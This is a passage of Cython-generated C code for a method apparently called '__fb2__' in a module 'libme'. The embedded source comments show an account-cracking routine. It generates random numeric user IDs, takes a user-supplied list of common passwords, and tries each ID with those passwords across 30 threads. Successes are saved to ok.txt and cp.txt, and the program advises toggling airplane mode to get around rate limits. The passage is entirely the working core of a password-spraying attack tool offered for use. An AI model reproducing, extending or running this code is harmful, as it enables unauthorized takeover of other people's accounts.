 * 				i = random.randint(x,xx)
 * 				ib = idx             # <<<<<<<<<<<<<<
 * 				self.id.append(ib+str(i))
 * 			print("  [+] Total id > \033[0;91m(%s)\033[0;97m"%(len(self.id)))
 */
        __Pyx_INCREF(__pyx_v_idx);
        __Pyx_XDECREF_SET(__pyx_v_ib, __pyx_v_idx);

        /* "libme.pyx":243
 * 				i = random.randint(x,xx)
 * 				ib = idx
 * 				self.id.append(ib+str(i))             # <<<<<<<<<<<<<<
 * 			print("  [+] Total id > \033[0;91m(%s)\033[0;97m"%(len(self.id)))
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 */
        __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 243, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_9 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_v_i); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 243, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __pyx_t_13 = PyNumber_Add(__pyx_v_ib, __pyx_t_9); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 243, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_13);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __pyx_t_14 = __Pyx_PyObject_Append(__pyx_t_2, __pyx_t_13); if (unlikely(__pyx_t_14 == ((int)-1))) __PYX_ERR(0, 243, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

        /* "libme.pyx":240
 * 		limit = int(input("  [!] Enter The Number Of Ids : "))
 * 		try:
 * 			for i in range(limit):             # <<<<<<<<<<<<<<
 * 				i = random.randint(x,xx)
 * 				ib = idx
 */
      }
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

      /* "libme.pyx":244
 * 				ib = idx
 * 				self.id.append(ib+str(i))
 * 			print("  [+] Total id > \033[0;91m(%s)\033[0;97m"%(len(self.id)))             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For Example Separators : 123456,123456789")
 */
      __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 244, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_6 = PyObject_Length(__pyx_t_1); if (unlikely(__pyx_t_6 == ((Py_ssize_t)-1))) __PYX_ERR(0, 244, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_t_1 = PyInt_FromSsize_t(__pyx_t_6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 244, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_13 = __Pyx_PyString_Format(__pyx_kp_s_Total_id_0_91m_s_0_97m_2, __pyx_t_1); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 244, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_13);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      if (__Pyx_PrintOne(0, __pyx_t_13) < 0) __PYX_ERR(0, 244, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

      /* "libme.pyx":245
 * 				self.id.append(ib+str(i))
 * 			print("  [+] Total id > \033[0;91m(%s)\033[0;97m"%(len(self.id)))
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;97m[*] For Example Separators : 123456,123456789")
 * 				listpass = input("  [+] Enter password : ")
 */
      /*with:*/ {
        __Pyx_GetModuleGlobalName(__pyx_t_13, __pyx_n_s_ThreadPoolExecutor); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 245, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_13);
        __pyx_t_1 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 245, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_max_workers, __pyx_int_30) < 0) __PYX_ERR(0, 245, __pyx_L3_error)
        __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_13, __pyx_empty_tuple, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 245, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_15 = __Pyx_PyObject_LookupSpecial(__pyx_t_2, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 245, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_15);
        __pyx_t_13 = __Pyx_PyObject_LookupSpecial(__pyx_t_2, __pyx_n_s_enter); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 245, __pyx_L11_error)
        __Pyx_GOTREF(__pyx_t_13);
        __pyx_t_9 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_13))) {
          __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_13);
          if (likely(__pyx_t_9)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_13);
            __Pyx_INCREF(__pyx_t_9);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_13, function);
          }
        }
        __pyx_t_1 = (__pyx_t_9) ? __Pyx_PyObject_CallOneArg(__pyx_t_13, __pyx_t_9) : __Pyx_PyObject_CallNoArg(__pyx_t_13);
        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
        if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 245, __pyx_L11_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
        __pyx_t_13 = __pyx_t_1;
        __pyx_t_1 = 0;
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        /*try:*/ {
          {
            __Pyx_PyThreadState_declare
            __Pyx_PyThreadState_assign
            __Pyx_ExceptionSave(&__pyx_t_16, &__pyx_t_17, &__pyx_t_18);
            __Pyx_XGOTREF(__pyx_t_16);
            __Pyx_XGOTREF(__pyx_t_17);
            __Pyx_XGOTREF(__pyx_t_18);
            /*try:*/ {
              __pyx_v_coeg = __pyx_t_13;
              __pyx_t_13 = 0;

              /* "libme.pyx":246
 * 			print("  [+] Total id > \033[0;91m(%s)\033[0;97m"%(len(self.id)))
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For Example Separators : 123456,123456789")             # <<<<<<<<<<<<<<
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:
 */
              if (__Pyx_PrintOne(0, __pyx_kp_s_0_97m_For_Example_Separators_12) < 0) __PYX_ERR(0, 246, __pyx_L15_error)

              /* "libme.pyx":247
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For Example Separators : 123456,123456789")
 * 				listpass = input("  [+] Enter password : ")             # <<<<<<<<<<<<<<
 * 				if len(listpass)<=5:
 * 					exit("\n  [!]  Password Minimum 6 Characters")
 */
              __pyx_t_13 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__10, NULL); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 247, __pyx_L15_error)
              __Pyx_GOTREF(__pyx_t_13);
              __pyx_v_listpass = __pyx_t_13;
              __pyx_t_13 = 0;

              /* "libme.pyx":248
 * 				print("\n  \033[0;97m[*] For Example Separators : 123456,123456789")
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:             # <<<<<<<<<<<<<<
 * 					exit("\n  [!]  Password Minimum 6 Characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 */
              __pyx_t_6 = PyObject_Length(__pyx_v_listpass); if (unlikely(__pyx_t_6 == ((Py_ssize_t)-1))) __PYX_ERR(0, 248, __pyx_L15_error)
              __pyx_t_19 = ((__pyx_t_6 <= 5) != 0);
              if (__pyx_t_19) {

                /* "libme.pyx":249
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:
 * 					exit("\n  [!]  Password Minimum 6 Characters")             # <<<<<<<<<<<<<<
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 */
                __pyx_t_13 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__18, NULL); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 249, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_13);
                __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

                /* "libme.pyx":248
 * 				print("\n  \033[0;97m[*] For Example Separators : 123456,123456789")
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:             # <<<<<<<<<<<<<<
 * 					exit("\n  [!]  Password Minimum 6 Characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 */
              }

              /* "libme.pyx":250
 * 				if len(listpass)<=5:
 * 					exit("\n  [!]  Password Minimum 6 Characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")
 */
              __pyx_t_13 = __Pyx_PyString_FormatSafe(__pyx_kp_s_0_97m_Crack_with_password_0_91m, __pyx_v_listpass); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 250, __pyx_L15_error)
              __Pyx_GOTREF(__pyx_t_13);
              if (__Pyx_PrintOne(0, __pyx_t_13) < 0) __PYX_ERR(0, 250, __pyx_L15_error)
              __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

              /* "libme.pyx":251
 * 					exit("\n  [!]  Password Minimum 6 Characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")             # <<<<<<<<<<<<<<
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 */
              if (__Pyx_PrintOne(0, __pyx_kp_s_0_97m_Ok_result_saved_in_ok_txt) < 0) __PYX_ERR(0, 251, __pyx_L15_error)

              /* "libme.pyx":252
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")             # <<<<<<<<<<<<<<
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 				for user in self.id:
 */
              if (__Pyx_PrintOne(0, __pyx_kp_s_Cp_result_saved_in_cp_txt) < 0) __PYX_ERR(0, 252, __pyx_L15_error)

              /* "libme.pyx":253
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")             # <<<<<<<<<<<<<<
 * 				for user in self.id:
 * 					coeg.submit(self.__apii__, user, listpass.split(","))
 */
              if (__Pyx_PrintOne(0, __pyx_kp_s_If_No_Result_Turn_On_Airplane_M) < 0) __PYX_ERR(0, 253, __pyx_L15_error)

              /* "libme.pyx":254
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 				for user in self.id:             # <<<<<<<<<<<<<<
 * 					coeg.submit(self.__apii__, user, listpass.split(","))
 * 			exit("\n\n () cracking finished...")
 */
              __pyx_t_13 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 254, __pyx_L15_error)
              __Pyx_GOTREF(__pyx_t_13);
              if (likely(PyList_CheckExact(__pyx_t_13)) || PyTuple_CheckExact(__pyx_t_13)) {
                __pyx_t_2 = __pyx_t_13; __Pyx_INCREF(__pyx_t_2); __pyx_t_6 = 0;
                __pyx_t_7 = NULL;
              } else {
                __pyx_t_6 = -1; __pyx_t_2 = PyObject_GetIter(__pyx_t_13); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 254, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_2);
                __pyx_t_7 = Py_TYPE(__pyx_t_2)->tp_iternext; if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 254, __pyx_L15_error)
              }
              __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
              for (;;) {
                if (likely(!__pyx_t_7)) {
                  if (likely(PyList_CheckExact(__pyx_t_2))) {
                    if (__pyx_t_6 >= PyList_GET_SIZE(__pyx_t_2)) break;
                    #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                    __pyx_t_13 = PyList_GET_ITEM(__pyx_t_2, __pyx_t_6); __Pyx_INCREF(__pyx_t_13); __pyx_t_6++; if (unlikely(0 < 0)) __PYX_ERR(0, 254, __pyx_L15_error)
                    #else
                    __pyx_t_13 = PySequence_ITEM(__pyx_t_2, __pyx_t_6); __pyx_t_6++; if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 254, __pyx_L15_error)
                    __Pyx_GOTREF(__pyx_t_13);
                    #endif
                  } else {
                    if (__pyx_t_6 >= PyTuple_GET_SIZE(__pyx_t_2)) break;
                    #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                    __pyx_t_13 = PyTuple_GET_ITEM(__pyx_t_2, __pyx_t_6); __Pyx_INCREF(__pyx_t_13); __pyx_t_6++; if (unlikely(0 < 0)) __PYX_ERR(0, 254, __pyx_L15_error)
                    #else
                    __pyx_t_13 = PySequence_ITEM(__pyx_t_2, __pyx_t_6); __pyx_t_6++; if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 254, __pyx_L15_error)
                    __Pyx_GOTREF(__pyx_t_13);
                    #endif
                  }
                } else {
                  __pyx_t_13 = __pyx_t_7(__pyx_t_2);
                  if (unlikely(!__pyx_t_13)) {
                    PyObject* exc_type = PyErr_Occurred();
                    if (exc_type) {
                      if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                      else __PYX_ERR(0, 254, __pyx_L15_error)
                    }
                    break;
                  }
                  __Pyx_GOTREF(__pyx_t_13);
                }
                __Pyx_XDECREF_SET(__pyx_v_user, __pyx_t_13);
                __pyx_t_13 = 0;

                /* "libme.pyx":255
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 				for user in self.id:
 * 					coeg.submit(self.__apii__, user, listpass.split(","))             # <<<<<<<<<<<<<<
 * 			exit("\n\n () cracking finished...")
 * 		except Exception as e:
 */
                __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_coeg, __pyx_n_s_submit); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 255, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_1);
                __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_apii); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 255, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_9);
                __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_listpass, __pyx_n_s_split); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 255, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_8);
                __pyx_t_11 = NULL;
                if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
                  __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_8);
                  if (likely(__pyx_t_11)) {
                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
                    __Pyx_INCREF(__pyx_t_11);
                    __Pyx_INCREF(function);
                    __Pyx_DECREF_SET(__pyx_t_8, function);
                  }
                }
                __pyx_t_10 = (__pyx_t_11) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_11, __pyx_kp_s__12) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_kp_s__12);
                __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
                if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 255, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_10);
                __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
                __pyx_t_8 = NULL;
                __pyx_t_12 = 0;
                if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
                  __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_1);
                  if (likely(__pyx_t_8)) {
                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
                    __Pyx_INCREF(__pyx_t_8);
                    __Pyx_INCREF(function);
                    __Pyx_DECREF_SET(__pyx_t_1, function);
                    __pyx_t_12 = 1;
                  }
                }
                #if CYTHON_FAST_PYCALL
                if (PyFunction_Check(__pyx_t_1)) {
                  PyObject *__pyx_temp[4] = {__pyx_t_8, __pyx_t_9, __pyx_v_user, __pyx_t_10};
                  __pyx_t_13 = __Pyx_PyFunction_FastCall(__pyx_t_1, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 255, __pyx_L15_error)
                  __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
                  __Pyx_GOTREF(__pyx_t_13);
                  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
                } else
                #endif
                #if CYTHON_FAST_PYCCALL
                if (__Pyx_PyFastCFunction_Check(__pyx_t_1)) {
                  PyObject *__pyx_temp[4] = {__pyx_t_8, __pyx_t_9, __pyx_v_user, __pyx_t_10};
                  __pyx_t_13 = __Pyx_PyCFunction_FastCall(__pyx_t_1, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 255, __pyx_L15_error)
                  __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
                  __Pyx_GOTREF(__pyx_t_13);
                  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
                } else
                #endif
                {
                  __pyx_t_11 = PyTuple_New(3+__pyx_t_12); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 255, __pyx_L15_error)
                  __Pyx_GOTREF(__pyx_t_11);
                  if (__pyx_t_8) {
                    __Pyx_GIVEREF(__pyx_t_8); PyTuple_SET_ITEM(__pyx_t_11, 0, __pyx_t_8); __pyx_t_8 = NULL;
                  }
                  __Pyx_GIVEREF(__pyx_t_9);
                  PyTuple_SET_ITEM(__pyx_t_11, 0+__pyx_t_12, __pyx_t_9);
                  __Pyx_INCREF(__pyx_v_user);
                  __Pyx_GIVEREF(__pyx_v_user);
                  PyTuple_SET_ITEM(__pyx_t_11, 1+__pyx_t_12, __pyx_v_user);
                  __Pyx_GIVEREF(__pyx_t_10);
                  PyTuple_SET_ITEM(__pyx_t_11, 2+__pyx_t_12, __pyx_t_10);
                  __pyx_t_9 = 0;
                  __pyx_t_10 = 0;
                  __pyx_t_13 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_t_11, NULL); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 255, __pyx_L15_error)
                  __Pyx_GOTREF(__pyx_t_13);
                  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
                }
                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

                /* "libme.pyx":254
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 				for user in self.id:             # <<<<<<<<<<<<<<
 * 					coeg.submit(self.__apii__, user, listpass.split(","))
 * 			exit("\n\n () cracking finished...")
 */
              }
              __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

              /* "libme.pyx":245
 * 				self.id.append(ib+str(i))
 * 			print("  [+] Total id > \033[0;91m(%s)\033[0;97m"%(len(self.id)))
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;97m[*] For Example Separators : 123456,123456789")
 * 				listpass = input("  [+] Enter password : ")
 */
            }
            __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
            __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
            __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
            goto __pyx_L20_try_end;
            __pyx_L15_error:;
            __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
            __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
            __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
            __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
            __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
            /*except:*/ {
              __Pyx_AddTraceback("libme.James.__fb2__", __pyx_clineno, __pyx_lineno, __pyx_filename);
              if (__Pyx_GetException(&__pyx_t_2, &__pyx_t_13, &__pyx_t_1) < 0) __PYX_ERR(0, 245, __pyx_L17_except_error)
              __Pyx_GOTREF(__pyx_t_2);
              __Pyx_GOTREF(__pyx_t_13);
              __Pyx_GOTREF(__pyx_t_1);
              __pyx_t_11 = PyTuple_Pack(3, __pyx_t_2, __pyx_t_13, __pyx_t_1); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 245, __pyx_L17_except_error)
              __Pyx_GOTREF(__pyx_t_11);
              __pyx_t_20 = __Pyx_PyObject_Call(__pyx_t_15, __pyx_t_11, NULL);
              __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
              __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
              if (unlikely(!__pyx_t_20)) __PYX_ERR(0, 245, __pyx_L17_except_error)
              __Pyx_GOTREF(__pyx_t_20);
              __pyx_t_19 = __Pyx_PyObject_IsTrue(__pyx_t_20);
              __Pyx_DECREF(__pyx_t_20); __pyx_t_20 = 0;
              if (__pyx_t_19 < 0) __PYX_ERR(0, 245, __pyx_L17_except_error)
              __pyx_t_21 = ((!(__pyx_t_19 != 0)) != 0);
              if (__pyx_t_21) {
                __Pyx_GIVEREF(__pyx_t_2);
                __Pyx_GIVEREF(__pyx_t_13);
                __Pyx_XGIVEREF(__pyx_t_1);
                __Pyx_ErrRestoreWithState(__pyx_t_2, __pyx_t_13, __pyx_t_1);
                __pyx_t_2 = 0; __pyx_t_13 = 0; __pyx_t_1 = 0; 
                __PYX_ERR(0, 245, __pyx_L17_except_error)
              }
              __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
              __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
              __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
              goto __pyx_L16_exception_handled;
            }
            __pyx_L17_except_error:;
            __Pyx_XGIVEREF(__pyx_t_16);
            __Pyx_XGIVEREF(__pyx_t_17);
            __Pyx_XGIVEREF(__pyx_t_18);
            __Pyx_ExceptionReset(__pyx_t_16, __pyx_t_17, __pyx_t_18);
            goto __pyx_L3_error;
            __pyx_L16_exception_handled:;
            __Pyx_XGIVEREF(__pyx_t_16);
            __Pyx_XGIVEREF(__pyx_t_17);
            __Pyx_XGIVEREF(__pyx_t_18);
            __Pyx_ExceptionReset(__pyx_t_16, __pyx_t_17, __pyx_t_18);
            __pyx_L20_try_end:;
          }
        }
        /*finally:*/ {
          /*normal exit:*/{
            if (__pyx_t_15) {
              __pyx_t_18 = __Pyx_PyObject_Call(__pyx_t_15, __pyx_tuple__13, NULL);
              __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
              if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 245, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_18);
              __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
            }
            goto __pyx_L14;
          }
          __pyx_L14:;
        }
        goto __pyx_L27;
        __pyx_L11_error:;
        __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
        goto __pyx_L3_error;
        __pyx_L27:;
      }

      /* "libme.pyx":256
 * 				for user in self.id:
 * 					coeg.submit(self.__apii__, user, listpass.split(","))
 * 			exit("\n\n () cracking finished...")             # <<<<<<<<<<<<<<
 * 		except Exception as e:
 * 			exit(str(e))
 */
      __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__21, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 256, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

      /* "libme.pyx":239
 * 		idx = input("  \033[0;91m[+] Choose Code 11,12,13,14,15,16,17,18 : ")
 * 		limit = int(input("  [!] Enter The Number Of Ids : "))
 * 		try:             # <<<<<<<<<<<<<<
 * 			for i in range(limit):
 * 				i = random.randint(x,xx)
 */
    }
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
    __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    /* "libme.pyx":257
 * 					coeg.submit(self.__apii__, user, listpass.split(","))
 * 			exit("\n\n () cracking finished...")
 * 		except Exception as e:             # <<<<<<<<<<<<<<
 * 			exit(str(e))
 * 	def __fb3__(self):
 */
    __pyx_t_12 = __Pyx_PyErr_ExceptionMatches(((PyObject *)(&((PyTypeObject*)PyExc_Exception)[0])));
    if (__pyx_t_12) {
      __Pyx_AddTraceback("libme.James.__fb2__", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_1, &__pyx_t_13, &__pyx_t_2) < 0) __PYX_ERR(0, 257, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_GOTREF(__pyx_t_13);
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_13);
      __pyx_v_e = __pyx_t_13;

      /* "libme.pyx":258
 * 			exit("\n\n () cracking finished...")
 * 		except Exception as e:
 * 			exit(str(e))             # <<<<<<<<<<<<<<
 * 	def __fb3__(self):
 * 		x = 1111111
 */
      __pyx_t_11 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_v_e); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 258, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_11);
      __pyx_t_10 = __Pyx_PyObject_CallOneArg(__pyx_builtin_exit, __pyx_t_11); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 258, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    /* "libme.pyx":239
 * 		idx = input("  \033[0;91m[+] Choose Code 11,12,13,14,15,16,17,18 : ")
 * 		limit = int(input("  [!] Enter The Number Of Ids : "))
 * 		try:             # <<<<<<<<<<<<<<
 * 			for i in range(limit):
 * 				i = random.randint(x,xx)
 */
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_4, __pyx_t_5);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_4, __pyx_t_5);
    __pyx_L8_try_end:;
  }

  /* "libme.pyx":234
 * 		except Exception as e:
 * 			exit(str(e))
 * 	def __fb2__(self):             # <<<<<<<<<<<<<<
 * 		x = 11111111
 * 		xx = 99999999
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
